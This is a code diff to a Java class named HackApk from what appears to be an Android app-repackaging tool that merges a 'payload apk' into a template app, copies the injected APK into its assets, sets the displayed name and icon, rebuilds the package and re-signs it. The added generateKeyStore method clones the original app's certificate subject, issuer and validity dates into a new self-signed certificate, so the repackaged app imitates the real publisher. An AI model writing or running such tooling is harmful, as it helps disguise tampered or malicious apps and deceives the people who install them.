@@ -8,15 +8,28 @@ import org.dom4j.DocumentException;
 import org.dom4j.Element;
 import org.dom4j.io.SAXReader;
 import org.dom4j.io.XMLWriter;
+import org.bouncycastle.asn1.x500.X500Name;
+import org.bouncycastle.cert.X509CertificateHolder;
+import org.bouncycastle.cert.X509v3CertificateBuilder;
+import org.bouncycastle.cert.jcajce.JcaX509CertificateConverter;
+import org.bouncycastle.cert.jcajce.JcaX509v3CertificateBuilder;
+import org.bouncycastle.operator.ContentSigner;
+import org.bouncycastle.operator.jcajce.JcaContentSignerBuilder;
+import org.bouncycastle.pkcs.PKCS10CertificationRequest;
+import org.bouncycastle.pkcs.jcajce.JcaPKCS10CertificationRequestBuilder;
 
 import java.io.*;
-import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
+import java.math.BigInteger;
 import java.net.URL;
 import java.net.URLClassLoader;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
+import java.security.*;
+import java.security.cert.X509Certificate;
+import java.util.Date;
 import java.util.List;
 import java.util.Objects;
 import java.util.jar.JarFile;
@@ -24,6 +37,8 @@ import java.util.jar.Manifest;
 
 public class HackApk {
     private final String TAG = "HackApk";
+    private static final String ALLOWED_CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
     HackApk () {
         // 初始化, 打开apk文件
     }
@@ -38,19 +53,94 @@ public class HackApk {
 
     }
 
+    public Boolean generateKeyStore() {
+        try {
+            if (Config.apkSigners == null) {
+                LogUtils.warn(TAG,"无法从APP中提取组织信息，使用自带的证书文件: " + Config.apkKeyStoreFilePath);
+                return true;
+            }
+
+            Config.apkSignerPass = generateRandomPassword(8);
+
+            // 添加BouncyCastle提供者
+            Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());
+
+            // 生成密钥对
+            KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA", "BC");
+            keyPairGenerator.initialize(2048);
+            KeyPair keyPair = keyPairGenerator.generateKeyPair();
+
+            // 生成证书请求
+            X500Name subject = new X500Name(Config.apkSigners.getSubjectX500Principal().getName());
+            PKCS10CertificationRequest csr = new JcaPKCS10CertificationRequestBuilder(subject, keyPair.getPublic())
+                    .build(new JcaContentSignerBuilder("SHA256withRSA").build(keyPair.getPrivate()));
+
+            // 获取证书信息
+            X500Name issuer = new X500Name(Config.apkSigners.getIssuerX500Principal().getName());
+            Date notBefore = Config.apkSigners.getNotBefore();
+            Date notAfter = Config.apkSigners.getNotAfter();
+            BigInteger serial = BigInteger.valueOf(System.currentTimeMillis());
+
+            // 生成新证书
+            X509v3CertificateBuilder certBuilder = new JcaX509v3CertificateBuilder(
+                    issuer,
+                    serial,
+                    notBefore,
+                    notAfter,
+                    subject,
+                    csr.getSubjectPublicKeyInfo()
+            );
+
+            ContentSigner contentSigner = new JcaContentSignerBuilder("SHA256withRSA").build(keyPair.getPrivate());
+            X509CertificateHolder certHolder = certBuilder.build(contentSigner);
+            X509Certificate newCert = new JcaX509CertificateConverter().setProvider("BC").getCertificate(certHolder);
+
+            // 保存证书到密钥库中
+            KeyStore keyStore = KeyStore.getInstance("PKCS12");
+            keyStore.load(null, null);
+            keyStore.setKeyEntry("520ApkBox", keyPair.getPrivate(), Config.apkSignerPass.toCharArray(), new X509Certificate[]{newCert});
+
+            // 将 keystore 保存到文件中
+            try (FileOutputStream fos = new FileOutputStream(Config.apkKeyStoreFilePath)) {
+                keyStore.store(fos, Config.apkSignerPass.toCharArray());
+            }
+
+            LogUtils.info(TAG, "使用获取到的组织信息，生成新的证书文件。新的证书文件保存在: " + Config.apkKeyStoreFilePath + " .  证书密码为: " + Config.apkSignerPass);
+        } catch (Exception e) {
+            e.printStackTrace();
+            return false;
+        }
+        return true;
+    }
+
+        private static String generateRandomPassword(int length) {
+            SecureRandom random = new SecureRandom();
+            StringBuilder password = new StringBuilder(length);
+            for (int i = 0; i < length; i++) {
+                // 生成随机索引，从 ALLOWED_CHARACTERS 中获取字符
+                int randomIndex = random.nextInt(ALLOWED_CHARACTERS.length());
+                char randomChar = ALLOWED_CHARACTERS.charAt(randomIndex);
+                password.append(randomChar);
+            }
+            return password.toString();
+        }
+
     public Boolean changeAndroidManifest() {
         LogUtils.info(TAG, "解析并修改模板Apk的AndroidManifest.xml文件. ");
         File xmlFile = new File(Config.apkBoxApkDecodeDir + "/AndroidManifest.xml");
         SAXReader xmlReader = new SAXReader();
         Document document;
-        try {
-            document = xmlReader.read(xmlFile);
-        } catch (DocumentException e) {
+        try (InputStream inputStream = new FileInputStream(xmlFile);
+             InputStreamReader inputStreamReader = new InputStreamReader(inputStream, StandardCharsets.UTF_8)) {
+            xmlReader.setEncoding(StandardCharsets.UTF_8.name());
+            document = xmlReader.read(inputStreamReader);
+        } catch (IOException | DocumentException e) {
             e.printStackTrace();
             return false;
         }
         Element rootElement = document.getRootElement();
 
+        // 设置 apkbox 中相关的配置项。
         List<Element> metaDataElements = rootElement.element("application").elements("meta-data");
         for (Element metaDataElement : metaDataElements){
             if(metaDataElement.attribute("name").getValue().equals("HackAppFileName")){
@@ -115,13 +205,16 @@ public class HackApk {
             LogUtils.debug(TAG, metaDataElement.toString());
         }
 
+        // 读取payload apk中的信息，追加到 apkbox 中
         LogUtils.info(TAG, "将payload apk中的 AndroidManifest-new.xml 追加到apkbox的 AndroidManifest.xml中.");
         File newXmlFile = new File(Config.payloadApkNewManifestFile);
         SAXReader newXmlReader = new SAXReader();
         Document newDocument;
-        try {
-            newDocument = newXmlReader.read(newXmlFile);
-        } catch (DocumentException e) {
+        try (InputStream inputStream = new FileInputStream(newXmlFile);
+             InputStreamReader inputStreamReader = new InputStreamReader(inputStream, StandardCharsets.UTF_8)) {
+            newXmlReader.setEncoding(StandardCharsets.UTF_8.name());
+            newDocument = newXmlReader.read(inputStreamReader);
+        } catch (IOException | DocumentException e) {
             e.printStackTrace();
             return false;
         }
@@ -133,9 +226,10 @@ public class HackApk {
         LogUtils.debug(TAG, rootElement.element("application").toString());
 
         LogUtils.debug(TAG, rootElement.element("application").elements("meta-data").toString());
-        try (FileWriter fileWriter = new FileWriter(xmlFile)) {
-            XMLWriter writer = new XMLWriter(fileWriter);
-            writer.write( document );
+        try (OutputStream outputStream = new FileOutputStream(xmlFile);
+             OutputStreamWriter outputStreamWriter = new OutputStreamWriter(outputStream, StandardCharsets.UTF_8)) {
+            XMLWriter writer = new XMLWriter(outputStreamWriter);
+            writer.write(document);
             writer.close();
             LogUtils.info(TAG, "写入模板App的AndroidManifest.xml文件成功.");
         } catch (IOException e) {
@@ -147,13 +241,17 @@ public class HackApk {
         LogUtils.info(TAG, "解析并修改模板App的string.xml文件. ");
         xmlFile = new File(Config.apkBoxApkDecodeDir + "/res/values/strings.xml");
         xmlReader = new SAXReader();
-        try {
-            document = xmlReader.read(xmlFile);
-        } catch (DocumentException e) {
+        try (InputStream inputStream = new FileInputStream(xmlFile);
+             InputStreamReader inputStreamReader = new InputStreamReader(inputStream, StandardCharsets.UTF_8)) {
+            xmlReader.setEncoding(StandardCharsets.UTF_8.name());
+            document = xmlReader.read(inputStreamReader);
+        } catch (IOException | DocumentException e) {
             e.printStackTrace();
             return false;
         }
         rootElement = document.getRootElement();
+
+
         List<Element> stringElements = rootElement.elements("string");
         for (Element stringElement : stringElements){
             if(stringElement.attribute("name").getValue().equals("app_name")){
@@ -161,12 +259,14 @@ public class HackApk {
                 LogUtils.info(TAG, "设置模板App显示的名字. " + Config.apkMetaInfo.get("AppName"));
             }
         }
+
         LogUtils.debug(TAG, rootElement.elements("string").toString());
-        try (FileWriter fileWriter = new FileWriter(xmlFile)) {
-            XMLWriter writer = new XMLWriter(fileWriter);
-            writer.write( document );
+        try (OutputStream outputStream = new FileOutputStream(xmlFile);
+             OutputStreamWriter outputStreamWriter = new OutputStreamWriter(outputStream, StandardCharsets.UTF_8)) {
+            XMLWriter writer = new XMLWriter(outputStreamWriter);
+            writer.write(document);
             writer.close();
-             LogUtils.info(TAG, "写入模板App的string.xml文件成功.");
+            LogUtils.info(TAG, "写入模板App的string.xml文件成功.");
         } catch (IOException e) {
             LogUtils.error(TAG, "写入模板App的string.xml文件失败.");
             e.printStackTrace();
@@ -254,13 +354,15 @@ public class HackApk {
         FileUtils.copyFile(new File(Config.hackApkFilePath), new File(Config.apkBoxApkDecodeDir + String.format("/assets/%s", Config.assetsSourceApkFileName)));
         LogUtils.info(TAG, "已将被注入Apk复制到模板App的assets目录中.");
 
-        FileUtils.delete(new File(Config.apkBoxApkDecodeDir + "/res/mipmap-xxxhdpi/ic_launcher.png"));
-        LogUtils.info(TAG, "已清空模板App中的 mipmap-xxxhdpi 文件夹.");
-        FileUtils.copyFile(new File(Config.apkIconFilePath), new File(Config.apkBoxApkDecodeDir + "/res/mipmap-xxxhdpi/ic_launcher." + FilenameUtils.getExtension(Config.apkIconFilePath)));
+        if (Config.apkIconFilePath != null && new File(Config.apkIconFilePath).exists()){
+            FileUtils.delete(new File(Config.apkBoxApkDecodeDir + "/res/mipmap-xxxhdpi/ic_launcher.png"));
+            LogUtils.info(TAG, "已清空模板App中的 mipmap-xxxhdpi 文件夹.");
+            FileUtils.copyFile(new File(Config.apkIconFilePath), new File(Config.apkBoxApkDecodeDir + "/res/mipmap-xxxhdpi/ic_launcher." + FilenameUtils.getExtension(Config.apkIconFilePath)));
 //        if (!Objects.equals(Config.apkAdaptiveIconFilePath, "")){
 //            FileUtils.copyFile(new File(Config.apkAdaptiveIconFilePath), new File(Config.apkBoxApkDecodeDir + "/res/mipmap-xxxhdpi/ic_launcher_foreground." + FilenameUtils.getExtension(Config.apkIconFilePath)));
 //        }
-        LogUtils.info(TAG, "重新向模板App中的 mipmap-xxxhdpi 文件夹复制图标文件.");
+            LogUtils.info(TAG, "重新向模板App中的 mipmap-xxxhdpi 文件夹复制图标文件.");
+        }
 
         if (new File(Config.payloadApkDecodeDir + "/res/xml").exists()){
             FileUtils.copyDirectory(new File(Config.payloadApkDecodeDir + "/res/xml"), new File(Config.apkBoxApkDecodeDir + "/res/xml/"));
@@ -274,17 +376,22 @@ public class HackApk {
         LogUtils.info(TAG, "正在进行重新编译模板App.");
         Config.buildApkFilePath = System.getProperty("user.dir") + "/520ApkHook.apk";
 
-        return runJar(new File(Config.apkToolFilePath), new String[]{"b", "-o", Config.buildApkFilePath, Config.apkBoxApkDecodeDir});
+        return runJar(new File(Config.apkToolFilePath), new String[]{"b", "-f", "-o", Config.buildApkFilePath, Config.apkBoxApkDecodeDir});
     }
 
     public Boolean signerApk(){
         LogUtils.info(TAG, "正在对模板App重新进行签名.");
 
-        return runJar(new File(Config.apkSignerFilePath), new String[]{"sign", "--ks", Config.apkKeyStoreFilePath, "-ks-pass", "pass:p@ssw0rd", Config.buildApkFilePath});
+        return runJar(new File(Config.apkSignerFilePath), new String[]{"sign", "--ks", Config.apkKeyStoreFilePath, "-ks-pass", "pass:" + Config.apkSignerPass, Config.buildApkFilePath});
     }
 
     public Boolean runJar(File file, String[] args) {
-        if (Config.IsJar){
+
+        String[] fullCommand = (String[]) ArrayUtils.addAll(new String[]{"java", "-jar", file.getAbsolutePath()}, args);
+
+        LogUtils.info(TAG, "进行jar执行: " + String.join(" ", fullCommand));
+
+        if (Config.IsJar) {
             final String mainClass;
             final JarFile jarFile;
             try {
@@ -300,38 +407,41 @@ public class HackApk {
                 final Method method = classToLoad.getDeclaredMethod("main", String[].class);
                 final Object[] arguments = {args};
                 method.invoke(null, arguments);
-            } catch (IOException | ClassNotFoundException | NoSuchMethodException | InvocationTargetException | IllegalAccessException e) {
-                e.printStackTrace();
-                return false;
+            }  catch (Exception e) {
+                // 反射调用失败，尝试以命令方式执行
+                LogUtils.warn(TAG, "反射调用失败，切换为直接命令执行。" + e.getMessage());
+                return runCommand(fullCommand);
             }
-        }else {
-            String[] command = (String[]) ArrayUtils.addAll(new String[]{"java", "-jar", file.getAbsolutePath()}, args);
-            try{
-                Process pid = Runtime.getRuntime().exec(command);
-                // 获取外部程序标准输出流
-                new Thread(new OutputHandlerRunnable(pid.getInputStream())).start();
-                // 获取外部程序标准错误流
-                new Thread(new OutputHandlerRunnable(pid.getErrorStream())).start();
-                pid.waitFor();
-            }catch (IOException | InterruptedException e){
-                e.printStackTrace();
-                return false;
-            }
+        } else {
+            return runCommand(fullCommand);
         }
         return true;
     }
 
-    private void replaceFileContent(Path filePath, String regex, String repl) throws IOException {
-//      Path filePath =   Paths.get(String "filePath")
-        String readFileData = Files.readString(filePath);
+    private Boolean runCommand(String[] fullCommand) {
+        try {
+            Process pid = Runtime.getRuntime().exec(fullCommand);
+            // 获取外部程序标准输出流
+            new Thread(new OutputHandlerRunnable(pid.getInputStream())).start();
+            // 获取外部程序标准错误流
+            new Thread(new OutputHandlerRunnable(pid.getErrorStream())).start();
+            pid.waitFor();
+            return true;
+        } catch (IOException | InterruptedException e) {
+            e.printStackTrace();
+            return false;
+        }
+    }
 
+    private void replaceFileContent(Path filePath, String regex, String repl) throws IOException {
+        String readFileData = Files.readString(filePath, StandardCharsets.UTF_8);
         readFileData = readFileData.replaceAll(regex, repl);
 
-        FileWriter fileWriter = new FileWriter(filePath.toFile());
-        BufferedWriter byteWrite = new BufferedWriter(fileWriter);
-        byteWrite.write(readFileData);
-        byteWrite.close();
+        try (BufferedWriter byteWrite = Files.newBufferedWriter(filePath, StandardCharsets.UTF_8)) {
+            byteWrite.write(readFileData);
+        }
     }
+
 
     private static class OutputHandlerRunnable implements Runnable {
         private final InputStream in;
